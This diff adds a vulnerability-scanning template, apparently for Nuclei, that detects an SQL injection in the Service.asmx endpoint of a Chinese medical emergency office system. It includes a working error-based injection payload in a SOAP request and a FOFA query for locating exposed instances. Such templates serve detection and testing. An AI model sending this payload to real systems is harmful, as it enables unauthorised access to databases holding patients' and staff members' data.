@@ -1,0 +1,51 @@
+id: anke-service-sqli
+
+info:
+  name: 安克医疗急救办公管理系统 Service.asmx - SQL注入漏洞
+  author: qwtd
+  severity: high
+  description: |
+    安克医疗急救办公管理系统 Service.asmx 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%89%E5%85%8B%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/%E7%8F%A0%E6%B5%B7%E5%B8%82%E5%AE%89%E5%85%8B%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%8C%BB%E7%96%97%E6%80%A5%E6%95%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa: app="安克医疗急救办公管理系统"
+    verified: true
+  tags: 安克医疗急救办公管理系统
+
+http:
+  - raw:
+      - |
+        POST /api/Service.asmx HTTP/1.1
+        X-Requested-With: XMLHttpRequest
+        Cookie: ASP.NET_SessionId=exrktu3aplxg004tcc2ntnuw; FailCount=5; ASPSESSIONIDSSDTSCDA=OLGBFHMCDJBLGKGENPLEECCO
+        SOAPAction: http://tempuri.org/GetAmbulance
+        Content-Type: text/xml
+        Content-Length: 296
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip,deflate,br
+        User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
+        Host: {{Hostname}}
+        Connection: Keep-alive
+
+        <?xml version="1.0"?>
+        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
+          <soap:Header />
+          <soap:Body>
+            <tns:GetAmbulance>
+              <tns:CNumber>11' AND 6537 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6537=6537) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)))-- ntgj</tns:CNumber>
+            </tns:GetAmbulance>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qjbvq1qqvvq"
+          - "SqlException"
+        condition: and
+
+      - type: status
+        status:
+          - 500
